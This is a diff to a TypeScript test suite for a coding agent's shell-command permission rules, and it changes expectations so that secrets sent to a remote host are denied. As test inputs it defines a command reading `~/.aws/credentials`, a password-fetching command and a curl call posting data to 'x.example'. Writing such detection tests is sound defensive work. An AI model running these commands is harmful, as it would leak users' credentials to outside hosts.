@@ -25,12 +25,8 @@ const CODE_ASKS = ["ask:interpreter-network", "ask:interpreter-network (model)",
 const CREDENTIALS = `cat ${HOME}/.aws/credentials`
 const PASSWORD = "opencode service get password"
 const set = (rule: string, value: "off" | "ask" | "model" | "deny", base: ActiveRules = on): ActiveRules => ({ ...base, overrides: new Map([[rule, value]]) })
-/**
- * The credential file launched to a remote connection by the code is refused since Q26, where the printed secret keeps
- * its ask: the pair's deny reduced to that ask, unless the setting refuses the credential file.
- */
-const asBefore = (pair: string, active?: ActiveRules) =>
-  pair === "deny:secret-file-network" && active?.overrides?.get("secret-file-network") !== "deny" ? "ask:secret-file-network" : pair
+/** The printed secret launched to a remote connection by the code gets the credential file's finding since Q27 (Q26 for the file). */
+const asBefore = (pair: string, _active?: ActiveRules) => pair
 const SINK = `subprocess.run(['curl','-d',p,'http://x.example'])`
 
 describe("quality batch, Q25 review fixes", () => {
@@ -84,8 +80,8 @@ describe("quality batch, Q25 review fixes", () => {
     // A user rule with that identifier: the credential file's deny is not reduced, nor is this one.
     const custom = [{ id: "secret-file-network", verdict: "ask", reason: "user rule", pattern: /never-matches-anything/, tools: ["shell"] }]
     for (const form of forms) assert.equal(shell(form(PASSWORD), undefined, custom), shell(form(CREDENTIALS), undefined, custom))
-    // Default settings: an ask, never a deny.
-    for (const form of forms) for (const active of [undefined, ...bases]) assert.equal(shell(form(PASSWORD), active), "ask:secret-file-network")
+    // Default settings: launched to a remote connection, a deny since Q27; only printed, an ask, never a deny.
+    for (const [i, form] of forms.entries()) for (const active of [undefined, ...bases]) assert.equal(shell(form(PASSWORD), active), i < 2 ? "deny:secret-file-network" : "ask:secret-file-network")
   })
 
   it("Q25C-4: the network program turned off, the only ask from the equivalent shell form of the code: that of the credential file", () => {
@@ -95,8 +91,9 @@ describe("quality batch, Q25 review fixes", () => {
       ...(["ask", "model", "deny"] as const).map((value) => set("secret-file-network", value, { ...base, dangerousCommands: false })),
     ])
     for (const form of forms.slice(0, 2)) for (const active of settings) assert.equal(shell(form(PASSWORD), active), asBefore(shell(form(CREDENTIALS), active), active), form(PASSWORD))
-    // Witnesses: a deny of that form kept; without secret-file-network, the ask of `opencode-service` unchanged.
-    assert.equal(shell(forms[0]!(PASSWORD), set("opencode-service", "deny", { ...on, dangerousCommands: false })), "deny:opencode-service")
+    // Witnesses: a deny of that form kept (since Q27, that of the printed secret launched to a remote connection, found
+    // first); without secret-file-network, the ask of `opencode-service` unchanged.
+    assert.equal(shell(forms[0]!(PASSWORD), set("opencode-service", "deny", { ...on, dangerousCommands: false })), "deny:secret-file-network")
     assert.equal(shell(forms[0]!(PASSWORD), { ...SP, dangerousCommands: false, sensitiveFiles: false }), "ask:opencode-service (model)")
     assert.equal(shell(forms[0]!(PASSWORD), { dangerousCommands: false, sensitiveFiles: false }), "ask:opencode-service")
   })
